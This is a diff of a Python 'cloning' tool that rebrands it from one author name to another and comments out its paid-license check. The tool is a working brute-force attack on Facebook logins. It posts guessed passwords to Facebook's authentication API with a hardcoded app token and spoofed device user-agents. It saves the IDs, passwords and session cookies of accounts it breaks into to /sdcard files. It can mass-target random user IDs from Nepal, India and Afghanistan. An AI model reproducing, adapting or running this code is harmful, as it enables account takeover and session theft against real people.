@@ -1,7 +1,7 @@
 #!coding : utf-8
 #!usr/lib/python3.11
 #OPEN SOURCE BY JUTT
-print(" Open source by JUTTBRAND")
+print(" PLEASE WAIT ")
 ##------------------[ INSTALL-MENU ]------------------##
 import uuid
 import os,sys,time
@@ -55,7 +55,7 @@ else:
 #───────────────[BIT ROOM]───────────────────────── #
 import os, platform, time, sys
 #os.system('pkg install espeak ')
-print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mLIMON-HASAN\33[1;91m⊁ ')
+print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mMANAS-HASAN\33[1;91m⊁ ')
 #os.system('espeak -a 300 " ,FILE CLONING 0.1, TOOLS,INSTALL Complete ,"')
 time.sleep(1)
 os.system('clear')
@@ -157,7 +157,7 @@ def clr():
     try:
         data = os.listdir('/sdcard/*')
         if 'Android' in data:
-            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY LIMON');exit()
+            print(' \033[1;32m[!]\033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \n YOUR'+' BYPAS'+'S FUCK'+'ED BY MANAS');exit()
         else:exit()
     except:exit()   
 
@@ -173,7 +173,7 @@ princp=[]
 usr=[]
 android_models=[]
 #-----------------------------------------------------#
-bLIMON="\033[1;30m" 
+bMANAS="\033[1;30m" 
 M="\033[1;31m" 
 W = '\x1b[1;97m' #white 
 Y = '\x1b[1;93m' #yellow 
@@ -270,68 +270,59 @@ device = {
         'fbdm':fbdm}
 #-----------------------------------------------------#
 kkkkki = random.choice(['SM-G920F','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
-def limon1():
+def MANAS1():
         ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/791484986;FBBV/444411021;FBDM/{density=2.25,width=720,height=1280};FBLC/it_IT;FBRV/791484986;FBCR/Jazz;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/'+str(kkkkki)+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,641=480,height=1041};FB_FW/1;]'
         return ua
 #-----------------------------------------------------#
 #os.system('xdg-open https://chat.whatsapp.com/Kyh2gU9DkDPFsJIGekbkug ')
-logo1 = f"""{W}
-\033[1;32::::    ::::   ::::::::  ::::    ::::  ::::::::::: ::::    ::: 
-\033[1;31+:+:+: :+:+:+ :+:    :+: +:+:+: :+:+:+     :+:     :+:+:   :+: 
-\033[1;33+:+ +:+:+ +:+ +:+    +:+ +:+ +:+:+ +:+     +:+     :+:+:+  +:+ 
-\033[1;32+#+  +:+  +#+ +#+    +:+ +#+  +:+  +#+     +#+     +#+ +:+ +#+ 
-\033[1;33m+#+       +#+ +#+    +#+ +#+       +#+     +#+     +#+  +#+#+# 
-\033[1;33m#+#       #+# #+#    #+# #+#       #+#     #+#     #+#   #+#+# 
-\033[1;33m###       ###  ########  ###       ### ########### ###    #### 
-\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
- [<>] \033[1;36mOWNER   :  MD LIMON TALUKDER
- [<>] \033[1;32mBROTHER :  HADI ANHAF AIMAN
- [<>] \033[1;34mGITHUB  :  LIMON-HASAN
- [<>] \033[1;35mSTATUS  :  TRYL
- [<>] \033[1;31mTOOLS   :  FILE X RANDOM
- [<>] \033[1;37mVERSION :  \033[1;32m 0.5\033[1;32m \033[1;37m
-\033[1;33m<><><><><><><><><<><><><><><><><><><><><><><>
-\033[1;32m═══════════════════════════════════════════════
- LICENSE  : {MY_KEY}
-\033[1;32m═══════════════════════════════════════════════"""
-
-line = f"{Y}<><><><<><><><><><><><><><><><><><><><>"
+logo=("""     ___ ___                     _____.___.
+\x1b[38;5;231m ███╗   ███╗ █████╗ ███╗   ██╗ █████╗ ███████╗    \x1b[38;5;231m
+\x1b[38;5;231m ████╗ ████║██╔══██╗████╗  ██║██╔══██╗██╔════╝    \x1b[38;5;231m
+\x1b[38;5;231m ██╔████╔██║███████║██╔██╗ ██║███████║███████╗    \x1b[38;5;231m
+\x1b[38;5;231m ██║╚██╔╝██║██╔══██║██║╚██╗██║██╔══██║╚════██║    \x1b[38;5;231m
+\x1b[38;5;231m ██║ ╚═╝ ██║██║  ██║██║ ╚████║██║  ██║███████║    \x1b[38;5;231m
+\x1b[38;5;231m ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝  \x1b[38;5;231m """)
+print(f"""\x1b[37m----------------------------------------------
+ AUTHOR     : MANAS TAMANG
+ GITHUB     : MANAS-EXE
+ FACEBOOK   : MAN AS
+ VERSION    : 0.0.1
+\x1b[37m----------------------------------------------""")
 
 def clear():os.system('clear');print(logo1)
 def linex():print(line)
 
 #                                                RANDOM M1 UP
 kkkkki = random.choice(['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
-def limon2():
+def MANAS2():
         ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/433.0.0.31.111;FBBV/444411021;FBDM/{density=2.25,width=720,height=1280};FBLC/en_NP;FBRV/791484986;FBCR/Nepal Telecom;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX3663;FBSV/13;nullFBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,641=480,height=1041};FB_FW/1;]'
         return ua
 
-class apvroval:
-    def check():
-        url = "https://github.com/manas-2063/approval/blob/main/approval.txt"
-        import mechanize
-        my_awm = mechanize.Browser()
-        try:
-            host = my_awm.open(url)
-            check_key = str(host.read())
-            if MY_KEY in check_key:
-                Main.Awm()
-            else:
-                clear()
-                print(f'{W} THIS TOOL IS PAID.SO,YOU NEED PERMISSION TO USE THIS TOOL')
-                os.system('xdg-open https://wa.me/+8801919182252 ')
-                print(' SEND YOUR KEY TO GET APPROVAL');linex()
-        except Exception as e:
-            print(e)
-            exit()
-
+#class apvroval:
+    #def check():
+      ##  url = "https://github.com/manas-2063/approval/blob/main/approval.txt"
+     #   import mechanize
+     #   my_awm = mechanize.Browser()
+       # try:
+            #host = my_awm.open(url)
+           # check_key = str(host.read())
+           # if MY_KEY in check_key:
+                #Main.Awm()
+         ##   else:
+               ## clear()
+              #  print(f#'{W} THIS TOOL IS PAID.SO,YOU NEED PERMISSION TO USE THIS TOOL')
+               # os.system#('xdg-open https://wa.me/+8801919182252 ')
+                #print(#' SEND YOUR KEY TO GET APPROVAL');linex()
+        #except# Exception a#s e:
+            #print(e#)
+            #exit()
+#
 
 class Main:
     def Awm():
         clear()
         print(f'{G} [1]<>FILE CLONING')
         print(f' [2]<>RANDOM CLONING')
-        print(f' [3]<>FOLLOW GITHUB')
         print(f' [4]<>EXIT PROGRAM')
         linex()
         awm = input(f' ~SELECT OPTION :{G} ');linex()
@@ -358,8 +349,8 @@ def Awm_File():
         tl = str(len(fo))
         clear()
         print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")
-        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/LIMON-OK.txt{W}")
-        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/LIMON-CP.txt{W}")
+        print(f" TOTAL OK ID SAVE IN : {G}/sdcard/MANAS-OK.txt{W}")
+        print(f" TOTAL CP ID SAVE IN : {R}/sdcard/MANAS-CP.txt{W}")
         print(f" USE AIRPLANE MOD FOR GOOD RESULT{G}")
         print(f"---------------------------------------------------")
         for user in fo:
@@ -382,7 +373,7 @@ def Awm_rndm():
     clear()
     print(f' [1] <>NEPAL UID CLONING')
     print(f' [2] <>INDIA UID CLONING')
-    print(f' [3] <> AFGHANISTAN UID CLONING')
+    print(f' [3] <>AFGHANISTAN UID CLONING')
     linex()
     awm = input(f' ~SELECT OPTION  :{G} ');linex()
     if awm in ['1']:Akash.nepal()
@@ -404,8 +395,8 @@ class Akash:
             tl = str(len(bou))
             clear()
             print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")
-            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/LIMON-OK.txt{W}")
-            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/LIMON-CP.txt{W}")
+            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/MANAS-OK.txt{W}")
+            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/MANAS-CP.txt{W}")
             print(f" NEPAL COUNTRY IDS CLONING STARTED...")
             print(f"---------------------------------------------------")
             for love in bou:
@@ -433,8 +424,8 @@ class Akash:
             tl = str(len(bou))
             clear()
             print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")
-            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/LIMON-OK.txt{W}")
-            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/LIMON-CP.txt{W}")
+            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/MANAS-OK.txt{W}")
+            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/MANAS-CP.txt{W}")
             print(f" INDIA COUNTRY IDS CLONING STARTED....")
             print(f"---------------------------------------------------")
             for love in bou:
@@ -462,8 +453,8 @@ class Akash:
             tl = str(len(bou))
             clear()
             print(f" TOTAL ID FROM CRACK : {S} {tl}{W}")
-            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/LIMON-OK.txt{W}")
-            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/LIMON-CP.txt{W}")
+            print(f" TOTAL OK ID SAVE IN : {G}/sdcard/MANAS-OK.txt{W}")
+            print(f" TOTAL CP ID SAVE IN : {R}/sdcard/MANAS-CP.txt{W}")
             print(f" NEPAL COUNTRY IDS CLONING STARTED...")
             print(f"---------------------------------------------------")
             for love in bou:
@@ -521,7 +512,7 @@ def crack_file_A(ids,names,passlist):
             "api_key": "882a8490361da98702bf97a021ddc14d",
             "sig":"1d6bdac1d94b7eff5dfc99453b632a28"}
             head = {
-            "User-Agent": limon1(),
+            "User-Agent": MANAS1(),
             "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
             "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
             "X-FB-Net-HNI": str(random.randint(20000, 40000)),
@@ -538,12 +529,12 @@ def crack_file_A(ids,names,passlist):
             po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
             if "access_token" in po:
                 coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                print(f'\r\r {G}[LIMON-OK] {ids} | {pas}')
-                open('/sdcard/LIMON-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
+                print(f'\r\r {G}[MANAS-OK] {ids} | {pas}')
+                open('/sdcard/MANAS-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                open('/sdcard/LIMON-CP.txt','a').write(ids+'|'+pas+'\n')
+                open('/sdcard/MANAS-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
@@ -589,7 +580,7 @@ def crack_rand(ids,passlist):
             "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
             content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
             head = {
-            "User-Agent": limon2(),
+            "User-Agent": MANAS2(),
             "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32", # --> Use App ID|Token/Sig
             "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
             "X-FB-Net-HNI": str(random.randint(20000, 40000)),
@@ -606,19 +597,19 @@ def crack_rand(ids,passlist):
             if "access_token" in po:
                 uid = str(po['uid'])
                 coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                print(f'\r\r {G}[LIMON-OK] {uid} | {pas}')
-                open('/sdcard/LIMON-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                print(f'\r\r {G}[MANAS-OK] {uid} | {pas}')
+                open('/sdcard/MANAS-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 oks.append(ids)
                 break
             elif 'Please Confirm Email' in po:
                 uid = str(po['uid'])
                 coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                print(f'\r\r {G}[LIMON-OK] {uid} | {pas}')
-                open('/sdcard/LIMON-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                print(f'\r\r {G}[MANAS-OK] {uid} | {pas}')
+                open('/sdcard/MANAS-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                 oks.append(ids)
                 break
             elif 'www.facebook.com' in po['error']['message']:
-                open('/sdcard/LIMON-CP.txt','a').write(ids+'|'+pas+'\n')
+                open('/sdcard/MANAS-CP.txt','a').write(ids+'|'+pas+'\n')
                 cps.append(ids)
                 break
             else:continue
